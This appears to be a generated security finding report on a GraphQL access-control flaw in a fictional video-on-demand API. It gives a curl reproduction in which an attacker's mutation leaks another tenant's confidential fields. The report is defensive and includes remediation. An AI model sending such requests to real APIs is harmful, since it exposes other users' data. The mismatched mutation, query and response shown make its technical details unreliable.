# Security Analysis Report
**System:** StreamCore VOD Platform
**Domain:** Media / Video-On-Demand
**Example ID:** GQL-0319
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | HIGH | BAC — Pattern 2.2 | Metadata/attribute side-channel on `updateResource` — attacker leaks VOD content metadata via mutation response |

---

## Finding 1 — BAC: Metadata/Attribute Side-Channel via Mutation Response (Pattern 2.2)

### Summary
The GraphQL API at `https://api.streamcore-vod-platf.example.com/graphql` exposes an `updateResource` mutation whose response leaks sensitive metadata fields that the caller is not authorized to read. The attacker sends `ownerId: "attacker-c9b96f4c"` in the mutation and receives `sensitiveField` and `internalNotes` for `other-user-c9b96f4c` in the response under the `getResource` key (see inconsistency note below).

**Context.txt inconsistency (documented):** The HAR request uses `updateResource(id: "R-2319", input: {...})` (mutation), while the HAR response returns data under the key `getResource` (read). These names conflict. Both are faithfully reproduced here.

**Note:** `x-request-id: req-c9b96f4c` is a server-assigned response header; it does not appear in the outgoing request.

**Pattern:** 2.2 — Metadata / attribute side-channel (BAC)
**Affected endpoint:** `POST https://api.streamcore-vod-platf.example.com/graphql`

### Evidence from HAR (§6.0)

**Request — Attack (mutation)**
```
POST https://api.streamcore-vod-platf.example.com/graphql
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
Content-Type: application/json

{"query":"query VulnerableOp { updateResource(id: \"R-2319\", input: {status: \"approved\", ownerId: \"attacker-c9b96f4c\"}) { resourceId status } }"}
```

**Response — Victim VOD Record Metadata Leaked**
```json
{
  "data": {
    "getResource": {
      "tenantId": "tenant-6f4c",
      "ownerId": "other-user-c9b96f4c",
      "data": {
        "sensitiveField": "CONFIDENTIAL-c9b96f4c",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```

### Steps to Reproduce
```bash
TOKEN="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG"
curl -s -X POST "https://api.streamcore-vod-platf.example.com/graphql" \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"query":"query VulnerableOp { updateResource(id: \"R-2319\", input: {status: \"approved\", ownerId: \"attacker-c9b96f4c\"}) { resourceId status } }"}'
# Vulnerable: tenantId: tenant-6f4c, sensitiveField: CONFIDENTIAL-c9b96f4c
# Secure: {"errors":[{"message":"Forbidden"}]}
```

### Remediation
1. Mutation response type must only include fields the caller is authorized to read.
2. Remove `ownerId` and `tenantId` from writable mutation inputs.
3. Resolver must verify `object.tenantId` matches JWT `tenantId` claim.
